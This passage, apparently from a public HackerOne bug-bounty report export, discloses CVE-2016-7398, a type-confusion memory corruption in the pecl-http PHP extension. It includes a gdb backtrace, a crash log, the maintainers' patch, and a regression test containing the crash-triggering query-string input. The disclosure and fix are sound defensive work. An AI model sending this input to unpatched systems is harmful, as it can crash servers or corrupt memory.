\u003cspan class=\"na\"\u003eheap\u003c/span\u003e \u003cspan class=\"na\"\u003emeta-data\u003c/span\u003e \u003cspan class=\"na\"\u003eoverwritten*\u003c/span\u003e\n    \u003cspan class=\"na\"\u003e0x1091f50:\u003c/span\u003e  \u003cspan class=\"na\"\u003e0x0000070600000001\u003c/span\u003e  \u003cspan class=\"na\"\u003e0x800000017c9c614a\u003c/span\u003e\n    \u003cspan class=\"err\"\u003e/\u003c/span\u003e\u003cspan class=\"na\"\u003e*\u003c/span\u003e\n     \u003cspan class=\"na\"\u003e*\u003c/span\u003e \u003cspan class=\"err\"\u003e(\u003c/span\u003e\u003cspan class=\"na\"\u003e*\u003c/span\u003e\u003cspan class=\"err\"\u003e)\u003c/span\u003e \u003cspan class=\"na\"\u003e0x4142\u003c/span\u003e \u003cspan class=\"na\"\u003eoriginates\u003c/span\u003e \u003cspan class=\"na\"\u003efrom\u003c/span\u003e \u003cspan class=\"na\"\u003ebug73055\u003c/span\u003e\u003cspan class=\"err\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ebin\u003c/span\u003e \u003cspan class=\"na\"\u003eoffset\u003c/span\u003e \u003cspan class=\"na\"\u003e0x59\u003c/span\u003e\n     \u003cspan class=\"na\"\u003e*\u003c/span\u003e \u003cspan class=\"na\"\u003eThe\u003c/span\u003e \u003cspan class=\"na\"\u003enumeric\u003c/span\u003e \u003cspan class=\"na\"\u003estring\u003c/span\u003e \u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"na\"\u003e16706\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"na\"\u003eis\u003c/span\u003e \u003cspan class=\"na\"\u003econverted\u003c/span\u003e \u003cspan class=\"na\"\u003einto\u003c/span\u003e \u003cspan class=\"na\"\u003ethe\u003c/span\u003e \u003cspan class=\"na\"\u003einteger\u003c/span\u003e\n     \u003cspan class=\"na\"\u003e*\u003c/span\u003e \u003cspan class=\"na\"\u003eit\u003c/span\u003e \u003cspan class=\"na\"\u003eis\u003c/span\u003e \u003cspan class=\"na\"\u003erepresenting\u003c/span\u003e \u003cspan class=\"na\"\u003e0x4142\u003c/span\u003e \u003cspan class=\"err\"\u003e(\u003c/span\u003e\u003cspan class=\"na\"\u003esee\u003c/span\u003e \u003cspan class=\"na\"\u003esanitize_dimension\u003c/span\u003e\u003cspan class=\"err\"\u003e()).\u003c/span\u003e\n     \u003cspan class=\"na\"\u003e*\u003c/span\u003e\u003cspan class=\"err\"\u003e/\u003c/span\u003e\n\u003cspan class=\"na\"\u003egdb\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e bt                                 // for the record\n    #0  _zend_hash_index_add_or_update_i (flag=1, pData=0x7ffff425c6a0, h=16706, ht=0xf53dc0) at zend_hash.c:815\n    #1  _zend_hash_index_update (ht=0xf53dc0, h=16706, pData=pData@entry=0x7ffff425c6a0) at zend_hash.c:838\n    #2  0x00000000006b032b in merge_param (zdata=0x7fffffff9cf0, current_args=0x7fffffff9dd8, current_param=0x7fffffff9de0, params=\u003cspan class=\"nt\"\u003e\u0026lt;optimized\u003c/span\u003e \u003cspan class=\"na\"\u003eout\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e) at php_http_params.c:511\n    #3  push_param (params=\u003cspan class=\"nt\"\u003e\u0026lt;optimized\u003c/span\u003e \u003cspan class=\"na\"\u003eout\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e, state=\u003cspan class=\"nt\"\u003e\u0026lt;optimized\u003c/span\u003e \u003cspan class=\"na\"\u003eout\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e, opts=\u003cspan class=\"nt\"\u003e\u0026lt;optimized\u003c/span\u003e \u003cspan class=\"na\"\u003eout\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e) at php_http_params.c:607\n    #4  0x00000000006b2475 in php_http_params_parse (params=params@entry=0x7ffff42023f0, opts=opts@entry=0x7fffffff9e80) at php_http_params.c:755\n    #5  0x00000000006b5479 in php_http_querystring_parse (ht=0x7ffff42023f0, str=str@entry=0x7ffff4282018 \u0026#39;[\u0026#39; \u003cspan class=\"nt\"\u003e\u0026lt;repeats\u003c/span\u003e \u003cspan class=\"na\"\u003e27\u003c/span\u003e \u003cspan class=\"na\"\u003etimes\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e, \u0026quot;]]]]\u0026quot;, \u0026#39;[\u0026#39; \u003cspan class=\"nt\"\u003e\u0026lt;repeats\u003c/span\u003e \u003cspan class=\"na\"\u003e38\u003c/span\u003e \u003cspan class=\"na\"\u003etimes\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e, \u0026quot;\u003cspan class=\"err\"\u003e\u0026amp;\u003c/span\u003e%C0[]E[=\u003cspan class=\"err\"\u003e\u0026amp;\u003c/span\u003e2[\u003cspan class=\"err\"\u003e\u0026amp;\u003c/span\u003e%C0[]E[16706[*[\u0026quot;, len=\u003cspan class=\"nt\"\u003e\u0026lt;optimized\u003c/span\u003e \u003cspan class=\"na\"\u003eout\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e) at php_http_querystring.c:224\n    #6  0x00000000006b552c in php_http_querystring_update (qarray=qarray@entry=0x7fffffff9f80, params=params@entry=0x7ffff4213130, outstring=outstring@entry=0x0) at php_http_querystring.c:268\n    #7  0x00000000006b6029 in php_http_querystring_set (flags=0, params=0x7ffff4213130, instance=0x7ffff4213100) at php_http_querystring.c:49\n    #8  zim_HttpQueryString___construct (execute_data=\u003cspan class=\"nt\"\u003e\u0026lt;optimized\u003c/span\u003e \u003cspan class=\"na\"\u003eout\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e, return_value=\u003cspan class=\"nt\"\u003e\u0026lt;optimized\u003c/span\u003e \u003cspan class=\"na\"\u003eout\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e) at php_http_querystring.c:365\n    #9  0x00000000007b0a93 in ZEND_DO_FCALL_SPEC_RETVAL_UNUSED_HANDLER () at zend_vm_execute.h:970\n    [...]\ngdb\u0026gt; dis 1 2\ngdb\u0026gt; c\n    Fatal error: Uncaught http\\Exception\\BadQueryStringException: http\\QueryString::__construct(): Max input nesting level of 64 exceeded in http_querystr.php:5\n    Stack trace:\n    #0 http_querystr.php(5): http\\QueryString-\u0026gt;__construct(\u0026#39;[[[[[[[[[[[[[[[...\u0026#39;)\n    #1 {main}\n\n    Next \n      thrown in http_querystr.php on line 5\n    *** Error in `sapi/cli/php\u0026#39;: free(): invalid pointer: 0x0000000001091f50 ***\n    Program received signal SIGABRT, Aborted.\n    0x00007ffff577804f in raise () from /usr/lib/libc.so.6\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"patch\"\u003ePatch\u003c/h1\u003e\n\n\u003cp\u003eAfter careful review by the project maintainers the following patch may be used\u003cbr\u003e\nto fix the reported issue. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003eFrom 34ae784c44be4a60157947f8ccc8c918e9b6ba40 Mon Sep 17 00:00:00 2001\nFrom: rc0r \u0026lt;hlt99@blinkenshell.org\u0026gt;\nDate: Fri, 9 Sep 2016 11:31:57 +0200\nSubject: [PATCH] Type confusion vulnerability in merge_param() (#73055) fixed\n\u003c/span\u003e\n---\n src/php_http_params.c   |  2 +-\n tests/bug73055.phpt     | 25 +++++++++++++++++++++++++\n tests/data/bug73055.bin |  1 +\n 3 files changed, 27 insertions(+), 1 deletion(-)\n create mode 100644 tests/bug73055.phpt\n create mode 100644 tests/data/bug73055.bin\n\ndiff --git a/src/php_http_params.c b/src/php_http_params.c\n\u003cspan class=\"gh\"\u003eindex 8988f43..0846f47 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/src/php_http_params.c\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/src/php_http_params.c\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -489,7 +489,7 @@\u003c/span\u003e static void merge_param(HashTable *params, zval *zdata, zval **current_param, zv\n            zval *test_ptr;\n\n            while (Z_TYPE_P(zdata_ptr) == IS_ARRAY \u0026amp;\u0026amp; (test_ptr = zend_hash_get_current_data(Z_ARRVAL_P(zdata_ptr)))) {\n\u003cspan class=\"gd\"\u003e-               if (Z_TYPE_P(test_ptr) == IS_ARRAY) {\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+               if ((Z_TYPE_P(test_ptr) == IS_ARRAY) \u0026amp;\u0026amp; (Z_TYPE_P(ptr) == IS_ARRAY)) {\n\u003c/span\u003e                    zval *tmp_ptr = ptr;\n\n                    /* now find key in ptr */\n\u003cspan class=\"gh\"\u003ediff --git a/tests/bug73055.phpt b/tests/bug73055.phpt\n\u003c/span\u003e\u003cspan class=\"p\"\u003enew file mode 100644\n\u003c/span\u003e\u003cspan class=\"gh\"\u003eindex 0000000..260e823\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- /dev/null\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/tests/bug73055.phpt\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -0,0 +1,25 @@\u003c/span\u003e\n\u003cspan class=\"gi\"\u003e+--TEST--\n+Type confusion vulnerability in merge_param()\n+--SKIPIF--\n+\u0026lt;?php\n+include \u0026quot;skipif.inc\u0026quot;;\n+?\u0026gt;\n+--FILE--\n+\u0026lt;?php\n+\n+echo \u0026quot;Test\\n\u0026quot;;\n+try {\n+   echo new http\\QueryString(file_get_contents(__DIR__.\u0026quot;/data/bug73055.bin\u0026quot;)); // \u0026lt;- put provided sample into correct location\n+} catch (Exception $e) {\n+   echo $e;\n+}\n+?\u0026gt;\n+\n+===DONE===\n+--EXPECTF--\n+Test\n+%r(exception \u0026#39;)?%rhttp\\Exception\\BadQueryStringException%r(\u0026#39; with message \u0026#39;|: )%rhttp\\QueryString::__construct(): Max input nesting level of 64 exceeded in %sbug73055.php:5\n+Stack trace:\n+#0 %sbug73055.php(5): http\\QueryString-\u0026gt;__construct(\u0026#39;[[[[[[[[[[[[[[[...\u0026#39;)\n+#1 {main}\n+===DONE===\n\u003c/span\u003e\u003cspan class=\"err\"\u003e\\\u003c/span\u003e No newline at end of file\n\u003cspan class=\"gh\"\u003ediff --git a/tests/data/bug73055.bin b/tests/data/bug73055.bin\n\u003c/span\u003e\u003cspan class=\"p\"\u003enew file mode 100644\n\u003c/span\u003e\u003cspan class=\"gh\"\u003eindex 0000000..ad2dd9f\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- /dev/null\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/tests/data/bug73055.bin\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -0,0 +1 @@\u003c/span\u003e\n\u003cspan class=\"gi\"\u003e+[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]][[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[\u0026amp;%C0[]E[=\u0026amp;2[\u0026amp;%C0[]E[16706[*[\n\u003c/span\u003e\u003cspan class=\"err\"\u003e\\\u003c/span\u003e No newline at end of file\n\u003cspan class=\"gd\"\u003e-- \n\u003c/span\u003e\u003cspan class=\"p\"\u003e2.9.3\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"versions-known-to-be-affected\"\u003eVersions known to be affected\u003c/h1\u003e\n\n\u003cp\u003epecl-http extension versions up to and including:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e3.1.0beta2 (PHP 7)\u003c/li\u003e\n\u003cli\u003e2.6.0beta2 (PHP 5)\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"timeline\"\u003eTimeline\u003c/h1\u003e\n\n\u003cp\u003e2016-09-09  Initial report to PHP bug tracker (#73055)\u003cbr\u003e\n2016-09-12  Issue fixed in git repository, CVE requested\u003cbr\u003e\n2016-09-13  Mitre assigned CVE-2016-7398\u003c/p\u003e\n\n\u003ch1 id=\"references\"\u003eReferences\u003c/h1\u003e\n\n\u003cp\u003e\u003ca title=\"https://bugs.php.net/bug.php?id=73055\" href=\"/redirect?url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D73055\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugs.php.net/bug.php?id=73055\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca title=\"https://github.com/m6w6/ext-http/commit/17137d4ab1ce81a2cee0fae842340a344ef3da83\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fm6w6%2Fext-http%2Fcommit%2F17137d4ab1ce81a2cee0fae842340a344ef3da83\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/m6w6/ext-http/commit/17137d4ab1ce81a2cee0fae842340a344ef3da83\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca title=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7398\" href=\"/redirect?url=http%3A%2F%2Fcve.mitre.org%2Fcgi-bin%2Fcvename.cgi%3Fname%3DCVE-2016-7398\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7398\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-06-05T08:21:23.798Z","allow_singular_disclosure_after":-112565993.31480624,"singular_disclosure_allowed":true,"vote_count":4,"voters":["eveeez","brucedh","0xspade","spetr0x"],"severity":{"rating":"low","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1339069,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Same question as #174069","markdown_message":"\u003cp\u003eSame question as \u003ca href=\"/reports/174069\"\u003e#174069\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2016-12-03T20:56:06.433Z","updated_at":"2016-12-03T20:56:06.433Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1339196,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Same answer as #174069. Only a PHP bug tracker permission issue neither Mike nor I can resolve.","markdown_message":"\u003cp\u003eSame answer as \u003ca href=\"/reports/174069\"\u003e#174069\u003c/a\u003e. Only a PHP bug tracker permission issue neither Mike nor I can resolve.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-12-03T21:58:51.405Z","updated_at":"2016-12-03T21:58:51.405Z","actor":{"username":"rc0r","cleared":false,"url":"/rc0r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/153/304e6c45c12b1b9dec0c6c0f2ebd67341d234566_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1339220,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-03T22:15:54.748Z","updated_at":"2016-12-03T22:15:54.748Z","additional_data":{"old_severity":null,"new_severity":"Low","old_severity_id":null,"new_severity_id":11397},"actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1339221,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-03T22:16:02.898Z","updated_at":"2016-12-03T22:16:02.898Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"rc0r","url":"/rc0r"},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1339222,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-03T22:16:08.630Z","updated_at":"2016-12-03T22:16:08.630Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ibb-php","collaborator":{"username":"rc0r","url":"/rc0r"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1657979,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-06T08:21:23.770Z","updated_at":"2017-05-06T08:21:23.770Z","first_to_agree":true,"actor":{"username":"rc0r","cleared":false,"url":"/rc0r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/153/304e6c45c12b1b9dec0c6c0f2ebd67341d234566_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1709816,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-30T15:13:53.708Z","updated_at":"2017-05-30T15:13:53.708Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1709817,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-30T15:13:53.762Z","updated_at":"2017-05-30T15:13:53.762Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}